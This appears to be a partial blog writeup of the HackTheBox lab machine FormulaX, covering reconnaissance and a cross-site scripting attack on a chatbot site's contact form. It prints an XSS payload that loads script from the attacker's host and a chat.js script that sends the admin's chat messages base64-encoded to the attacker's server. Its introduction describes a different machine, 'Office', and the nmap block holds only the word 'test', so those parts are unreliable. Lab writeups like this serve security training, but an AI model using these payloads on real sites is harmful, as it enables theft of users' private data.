---
layout: single
title:  "HTB FormulaX Writeup"
seo_title: "Writeup for the HackTheBox FormulaX Machine"
date:   2024-08-22 21:00:00 +0200
categories: ['HackTheBox']
classes: wide
toc: true
header:
    teaser: "/assets/images/headers/Formulax.png"
---
Office is a hard-difficulty Windows machine featuring various vulnerabilities including Joomla web application abuse, PCAP analysis to identify Kerberos credentials, abusing LibreOffice macros after disabling the `MacroSecurityLevel` registry value, abusing MSKRP to dump DPAPI credentials and abusing Group Policies due to excessive Active Directory privileges. 

# Reconnaissance
As always, we start with an `nmap` scan of the host.

```console
$ nmap -p- 
test
```

We only find two open ports, `SSH` and `HTTP`, so we will proceed by enumerating the website.

## Website
Browsing to the website, we land on a login page for a `Problem-Solving` chatbot.
![vulnerability-setup-1](../assets/images/writeups/formulax/website-login.png)

We will create a new account. After logging in we can talk to the chatbot and issue the help command. One of the available commands allows us to show previous sent messages.
![vulnerability-setup-1](../assets/images/writeups/formulax/chatbot-help.png)

There is also a contact page and I tried to submit a simple XSS payload:

```http
<img src=x onerror="var s1=document.createElement('script');s1.src='http://10.10.14.167:80/chat.js';document.head.appendChild(s1);"/>
```
![vulnerability-setup-1](../assets/images/writeups/formulax/website-contact.png)

After sending the payload we get a request back. We make a new file called `chat.js` with the following contents.

```
const script = document.createElement('script');
script.src = '/socket.io/socket.io.js';
document.head.appendChild(script);
script.addEventListener('load', function() {
    const res = axios.get(`/user/api/chat`);
    const socket = io('/',{withCredentials: true});
    socket.on('message', (my_message) => {
        fetch("http://10.10.14.167:8888/?c=" + btoa(my_message))
    });
});
```

This script will load the admin users chat messages and send it to our local server.